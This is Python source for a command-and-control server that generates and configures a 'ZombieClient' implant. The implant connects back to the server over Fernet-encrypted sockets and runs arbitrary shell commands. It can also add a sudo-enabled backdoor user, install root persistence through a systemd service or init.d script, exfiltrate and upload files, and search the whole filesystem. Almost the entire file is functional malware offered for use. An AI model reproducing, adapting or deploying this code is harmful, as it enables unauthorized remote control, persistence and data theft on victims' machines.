import socket
import os
import json
import threading
from cryptography.fernet import Fernet
import random
import string

class C2Server:
    def __init__(self, bind_ip="0.0.0.0", bind_port=5555):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.key_file = os.path.join(self.script_dir, "keys.json")
        self.keys = self.load_or_generate_keys()
        self.server_ip = self.get_local_ip()
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.bind_ip, self.bind_port))
        self.server.listen(5)
        self.clients = []
        print(f"Listening on {self.bind_ip}:{self.bind_port}")
        self.generate_client_file()
        self.update_client_file()

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        except Exception as e:
            print(f"Could not determine local IP: {e}")
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip

    def load_or_generate_keys(self):
        if os.path.exists(self.key_file):
            with open(self.key_file, "r") as f:
                keys = json.load(f)
        else:
            keys = {}
            with open(self.key_file, "w") as f:
                json.dump(keys, f)
        return keys

    def save_key(self, client_id, key):
        self.keys[client_id] = key.decode()
        with open(self.key_file, "w") as f:
            json.dump(self.keys, f)

    def generate_client_file(self):
        self.client_id = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.key = Fernet.generate_key()
        self.save_key(self.client_id, self.key)

        client_script = f"""
import socket
import json
from cryptography.fernet import Fernet
import os
import random
import string
import subprocess


class ZombieClient:
    def __init__(self, server_ip, server_port, client_id, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_id = client_id
        self.cipher_suite = Fernet(key)
        self.connect_to_server()

    def connect_to_server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.server_ip, self.server_port))
        self.sock.sendall(self.client_id.encode())
        print("Connected to server")

    def receive_encrypted_message(self):
        encrypted_message = self.sock.recv(1024)
        return self.cipher_suite.decrypt(encrypted_message).decode()

    def send_encrypted_message(self, message):
        encrypted_message = self.cipher_suite.encrypt(message.encode())
        self.sock.sendall(encrypted_message)

    def listen_for_commands(self):
        while True:
            try:
                command = self.receive_encrypted_message()
                print(f"Received command: {{command}}")
                response = self.execute_command(command)
                self.send_encrypted_message(json.dumps(response))
            except Exception as e:
                print(f"Error: {{e}}")
                break

    def is_systemd(self):
        try:
            subprocess.run(["pidof", "systemd"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def execute_command(self, command):
        try:
            if command.startswith("createuser"):
                username = ''.join(random.choices(string.ascii_lowercase, k=8))
                password = username
                os.system(f"useradd -m -p $(openssl passwd -1 {{username}}) {{username}}")
                os.system(f"usermod -aG sudo {{username}}")
                return {{"result": f"User {{username}} created with password {{password}}"}}
            elif command.startswith("persistence"):
                client_file_path = os.path.abspath(__file__)

                if self.is_systemd():
                    service_file_path = "/etc/systemd/system/zombie_persistence.service"

                    service_file_content = f'''[Unit]
            Description=Zombie Persistence Service
            After=network-online.target
            Wants=network-online.target


            [Service]
            ExecStart=/usr/bin/python3 {{client_file_path}}
            StandardOutput=inherit
            StandardError=inherit
            Restart=always
            User=root


            [Install]
            WantedBy=multi-user.target
            '''
                    with open(service_file_path, "w") as f:
                        f.write(service_file_content)

                    os.system("systemctl daemon-reload")
                    os.system("systemctl enable zombie_persistence.service")
                    os.system("systemctl start zombie_persistence.service")
                    return {{"result": "Systemd service created and started"}}
                else:
                    persistence_file_path = "/etc/init.d/zombie_persistence"

                    with open(persistence_file_path, "w") as f:
                        f.write("#!/bin/bash\\n")
                        f.write("### BEGIN INIT INFO\\n")
                        f.write("# Provides:          zombie_persistence\\n") 
                        f.write("# Required-Start:    $remote_fs $syslog\\n")
                        f.write("# Required-Stop:     $remote_fs $syslog\\n")
                        f.write("# Default-Start:     2 3 4 5\\n")
                        f.write("# Default-Stop:      0 1 6\\n")
                        f.write("# Short-Description: Starts zombie persistence script\\n")
                        f.write("# Description:       Starts the zombie persistence script which runs every 60 seconds\\n")
                        f.write("### END INIT INFO\\n")
                        f.write("# do it every 60 seconds\\n")
                        f.write(f"while true; do python3 {{client_file_path}}; sleep 60; done\\n")

                    os.system(f"chmod +x {{persistence_file_path}}")
                    os.system("update-rc.d zombie_persistence defaults")
                    os.system("service zombie_persistence enable")
                    os.system("service zombie_persistence start")
                    return {{"result": "Init.d script created and started"}}
            elif command.startswith("download"):
                parts = command.split(" ")
                file_path = parts[1]
                if os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    self.send_encrypted_message(str(file_size))
                    with open(file_path, "rb") as f:
                        while chunk := f.read(4096):
                            self.sock.sendall(chunk)
                    return {{"result": f"File {{file_path}} downloaded successfully"}}
                else:
                    return {{"error": "File not found"}}
            elif command.startswith("upload"):
                parts = command.split(" ", 2)
                file_path = parts[1]
                file_data = parts[2].encode('latin1')
                with open(file_path, "wb") as f:
                    f.write(file_data)
                return {{"result": f"File {{file_path}} uploaded successfully"}}
            elif command.startswith("search"):
                parts = command.split(" ", 1)
                search_term = parts[1]
                matches = []
                for root, dirs, files in os.walk("/"):
                    for name in files:
                        if search_term in name:
                            matches.append(os.path.join(root, name))
                return {{"matches": matches}}
            elif command.startswith("lz"):
                result = os.popen("ls -la").read()
                formatted_result = "\\n".join(result.splitlines())
                return {{"result": formatted_result}}
            else:
                result = os.popen(command).read()
                return {{"result": result}}
        except Exception as e:
            return {{"error": str(e)}}

if __name__ == "__main__":
    client_id = '{self.client_id}'
    key = b'{self.key.decode()}'
    zombie = ZombieClient("SERVER_IP", SERVER_PORT, client_id, key)
    zombie.listen_for_commands()
"""
        client_file_path = os.path.join(self.script_dir, f"zombie_client_{self.client_id}.py")
        with open(client_file_path, "w") as f:
            f.write(client_script)
        print(f"Generated {client_file_path} with the necessary configurations.")

    def update_client_file(self):
        client_file_path = os.path.join(self.script_dir, f"zombie_client_{self.client_id}.py")
        with open(client_file_path, "r") as file:
            script_content = file.read()

        script_content = script_content.replace("SERVER_IP", self.server_ip)
        script_content = script_content.replace("SERVER_PORT", str(self.bind_port))

        with open(client_file_path, "w") as file:
            file.write(script_content)

        print(f"Updated {client_file_path} with server IP and port.")

    def handle_client(self, client_socket):
        try:
            global client_id
            client_id = client_socket.recv(1024).decode()
            if client_id in self.keys:
                key = self.keys[client_id].encode()
                cipher_suite = Fernet(key)
                self.clients.append((client_socket, cipher_suite, client_id))
                threading.Thread(target=self.client_listener, args=(client_socket, cipher_suite, client_id)).start()
                print(f"Accepted connection from Zombie with ID: {client_id}")
            else:
                client_socket.close()
                print(f"Connection attempt with unknown Zombie ID: {client_id}")
        except Exception as e:
            print(f"Error: {e}")

    def client_listener(self, client_socket, cipher_suite, client_id):
        while True:
            try:
                command = input(f"Enter command to send to Zombie {client_id}: ")
                encrypted_command = cipher_suite.encrypt(command.encode())
                client_socket.sendall(encrypted_command)
                encrypted_response = client_socket.recv(4096)
                response = json.loads(cipher_suite.decrypt(encrypted_response).decode())
                if "file_data" in response:
                    with open("downloaded_file", "wb") as f:
                        f.write(response["file_data"].encode('latin1'))
                    print(f"File downloaded and saved as 'downloaded_file'")
                else:
                    print(f"Zombie {client_id} response: {response}")
            except Exception as e:
                print(f"Error: {e}")
                break


    def start(self):
        while True:
            client_socket, addr = self.server.accept()
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    server = C2Server()
    server.start()
